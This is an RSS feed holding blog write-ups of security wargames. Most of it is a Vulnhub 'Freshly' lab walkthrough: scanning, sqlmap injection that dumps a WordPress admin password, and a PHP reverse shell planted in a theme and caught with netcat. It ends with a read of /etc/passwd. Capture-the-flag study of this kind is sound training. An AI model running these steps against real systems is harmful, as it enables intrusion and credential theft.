$ cat /etc/narnia_pass/narnia8 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Notice that the address of &lt;code&gt;ptrf&lt;/code&gt; is not the same in the shell :)&lt;/p&gt;

&lt;h2 id=&#34;level-08:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// gcc&amp;#39;s variable reordering fucked things up&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// to keep the level in its old style i am &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// making &amp;quot;i&amp;quot; global unti i find a fix &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// -morla &lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt; 

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;func&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #75715e&#34;&gt;//int i=0;&lt;/span&gt;
    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(bok,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(bok));&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[i]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i];&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,bok);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;       
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;func(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&amp;rsquo;ll update this when I have this figured out.&lt;/p&gt;

&lt;p&gt;Sorry.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>